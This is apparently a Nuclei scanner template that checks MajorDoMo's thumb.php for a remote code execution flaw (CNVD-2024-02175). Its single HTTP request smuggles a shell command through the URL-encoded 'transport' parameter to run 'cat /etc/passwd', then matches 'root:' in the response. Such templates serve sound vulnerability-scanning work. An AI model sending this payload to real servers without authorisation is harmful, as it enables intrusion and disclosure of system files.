id: majordomo-thumb-php-rce
info:
  name: MajorDoMo thumb.php Remote Code Execution Vulnerability (CNVD-2024-02175)
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce,CNVD-2024-02175
http:
  - raw:
      - |
        GET /modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+cat%20/etc/passwd%3B+echo+%27%5BE%5D%27%29%23%3B HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "root:"
          - "/bin"
          - "thumb"
        part: body
      - type: word
        words:
          - "<html"
        part: body
        negative: true
